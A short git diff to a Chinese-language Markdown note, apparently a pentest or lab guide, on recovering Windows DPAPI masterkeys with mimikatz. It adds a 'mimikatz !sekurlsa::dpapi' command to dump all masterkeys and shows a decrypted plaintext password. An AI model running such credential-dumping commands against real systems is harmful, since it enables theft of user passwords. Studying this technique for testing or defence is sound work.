@@ -106,6 +106,9 @@ SID               : S-1-5-21-569305411-121244042-2357301523-1104
    * sha1(key) :  897f7bf129e6a898ff4e20e9789009d5385be1f3
 ```
 
+## 找masterkey
+
+1. 直接指定要查找的GUID的masterkey
 
 知道了GUID，利用mimikatz获取masterkey，需要system或管理员权限
 ```
@@ -119,6 +122,13 @@ SID               : S-1-5-21-569305411-121244042-2357301523-1104
 ```
 
 上面的key就是解密需要的masterkey
+
+2. 导出所有的masterkey，根据GUID查找
+```
+mimikatz !sekurlsa::dpapi
+```
+
+## 解密
 
 解密凭据，得到明文密码：```Sup3rman```
 ```
